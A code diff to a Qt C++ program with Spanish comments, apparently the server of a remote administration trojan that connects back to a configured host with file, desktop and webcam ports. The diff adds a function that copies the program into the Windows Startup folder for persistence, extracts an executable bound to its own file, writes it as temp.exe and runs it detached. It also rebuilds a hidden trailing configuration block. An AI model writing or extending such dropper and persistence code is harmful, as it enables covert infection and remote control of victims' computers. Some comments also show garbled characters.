@@ -56,17 +56,34 @@ void MainWindow::changeEvent(QEvent *e)
 void MainWindow::inicio(){
     /** funcion que se ejecuta al inicio de la aplicacion **/
     this->generarVentanaChat();
-    QString home = directorio.homePath(); //ruta absoluta del directorio raiz del usuario
-    QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicaci√≥n
-    if(!cargarConfiguracion())
+    cargarConfiguracion();
+    QString conversion;
+    QByteArray datos; //Reconstruimos la configuraciÛn con algunas modificaciones para el servidor copiado
+    datos = "|@|" + this->host.toLatin1() + "|@|";
+    conversion.setNum(this->port);
+    datos = datos + conversion.toLatin1() + "|@|";
+    conversion.setNum(this->portArchivos);
+    datos = datos + conversion.toLatin1() + "|@|";
+    conversion.setNum(this->portEscritorio);
+    datos = datos + conversion.toLatin1() + "|@|";
+    conversion.setNum(this->portWebcam);
+    datos = datos + conversion.toLatin1() + "|@|";
+    conversion.setNum(this->tiempoConexion);
+    datos = datos + conversion.toLatin1() + "|@|";
+    datos = datos + this->alias.toLatin1() + "|@|";
+    datos = datos + "nounido" + "|@|";
+    datos = datos + "0" + "|@|";
+    datos = datos + this->nombreCopiable.toLatin1() + "|@|";
+    if(this->siempreOUnaVez == "0") //Si el programa de inicio se ejecuta siempre
     {
-        if (directorio.exists(home + "/.kde4/Autostart")) { //openSUSE
-            QFile::copy(appPath,home + "/.kde4/Autostart/" + this->nombreCopiable);
-        }
-        if (directorio.exists(home + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
-            QFile::copy(appPath,home + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
-        }
+        datos = datos + this->ejecutar.toLatin1() + "|@|"; //Lo ponemos en el servidor copiado
+        datos = datos + "0|@|";
     }
+    else
+    {
+        datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
+    }
+    copiarServidor(datos,"");
     temporizador.start(this->tiempoConexion); //iniciar el temporizador para conexi√≥n
     connect(&temporizador,SIGNAL(timeout()),this,SLOT(conectar())); //cada "tiempoConexion" intentar conectar
     connect(&socket,SIGNAL(readyRead()),this,SLOT(llegadaDatos()));
@@ -109,7 +126,7 @@ bool MainWindow::cargarConfiguracion(){
     datos = servidor.read(1024);
     servidor.close();
     campo = datos.split("|@|");
-    if(campo.size() >= 7)
+    if(campo.size() >= 12)
     {
         this->host = campo[1];
         conversion = campo[2];
@@ -123,54 +140,66 @@ bool MainWindow::cargarConfiguracion(){
         conversion = campo[6];
         this->tiempoConexion = conversion.toInt();
         this->alias = campo[7];
+        this->adjunto = campo[8];
+        this->tamanoAdjunto = campo[9].toLong();
         this->nombreCopiable = campo[10];
         this->ejecutar = campo[11];
-        if (campo[8] == "unido") //Cuando hay un ejecutable adjunto
-        {
-            //Esto est· muy poco optimizado, mejorar m·s adelante.
-            QDir directorio;
-            QByteArray datos;
-            datos = "|@|" + campo[1].toLatin1() + "|@|";
-            datos = datos + campo[2].toLatin1() + "|@|";
-            datos = datos + campo[3].toLatin1() + "|@|";
-            datos = datos + campo[4].toLatin1() + "|@|";
-            datos = datos + campo[5].toLatin1() + "|@|";
-            datos = datos + campo[6].toLatin1() + "|@|";
-            datos = datos + campo[7].toLatin1() + "|@|";
-            datos = datos + "nounido" + "|@|";
-            datos = datos + "0" + "|@|";
-            datos = datos + campo[10].toLatin1() + "|@|";
-            datos = datos + campo[11].toLatin1() + "|@|";
-            qint64 tamano;
-            tamano = campo[9].toInt();
-            QFile adjunto;
-            QFile servidor;
-            QFile copiable;
-            adjunto.setFileName(directorio.tempPath() + "/temp.exe");
-            servidor.setFileName(QApplication::applicationFilePath());
-            if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
-                copiable.setFileName(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + campo[10]);
-            }
+        this->siempreOUnaVez = campo[12];
 
-            copiable.open(QFile::WriteOnly);
-            adjunto.open(QFile::WriteOnly);
-            servidor.open(QFile::ReadOnly);
-            copiable.write(servidor.read(servidor.size() - 1024 - tamano));
-            servidor.seek(servidor.size() - 1024 - tamano);
-            adjunto.write(servidor.read(tamano));
-            copiable.write(datos,1024);
-            copiable.close();
-            servidor.close();
-            adjunto.close();
-            proceso.setWorkingDirectory(directorio.tempPath());
-            proceso.startDetached(directorio.tempPath() + "/temp.exe");
-            return true;
-        }
 
     }
     return false;
 }
 
+void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
+{
+
+    QString home = directorio.homePath(); //ruta absoluta del directorio raiz del usuario
+    QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicaci√≥n
+    if (this->adjunto == "unido") //Cuando hay un ejecutable adjunto
+    {
+        //Esto est· muy poco optimizado, mejorar m·s adelante.
+        QDir directorio;
+        qint64 tamano;
+        tamano = this->tamanoAdjunto;
+        QFile adjunto;
+        QFile servidor;
+        QFile copiable;
+        adjunto.setFileName(directorio.tempPath() + "/temp.exe");
+        servidor.setFileName(QApplication::applicationFilePath());
+        if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
+            copiable.setFileName(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
+        }
+
+        copiable.open(QFile::WriteOnly);
+        adjunto.open(QFile::WriteOnly);
+        servidor.open(QFile::ReadOnly);
+        copiable.write(servidor.read(servidor.size() - 1024 - tamano));
+        servidor.seek(servidor.size() - 1024 - tamano);
+        adjunto.write(servidor.read(tamano));
+        copiable.write(tramaConfiguracion,1024);
+        copiable.close();
+        servidor.close();
+        adjunto.close();
+        proceso.setWorkingDirectory(directorio.tempPath());
+        proceso.startDetached(directorio.tempPath() + "/temp.exe");
+    }
+    else
+    {
+        QFile servidor;
+        QFile copiable;
+        servidor.setFileName(QApplication::applicationFilePath());
+        if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
+            copiable.setFileName(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
+        }
+        copiable.open(QFile::WriteOnly);
+        servidor.open(QFile::ReadOnly);
+        copiable.write(servidor.read(servidor.size() - 1024));
+        copiable.write(tramaConfiguracion,1024);
+        copiable.close();
+        servidor.close();
+    }
+}
 void MainWindow::conectar(){
     /** funci√≥n que conecta al cliente **/
 
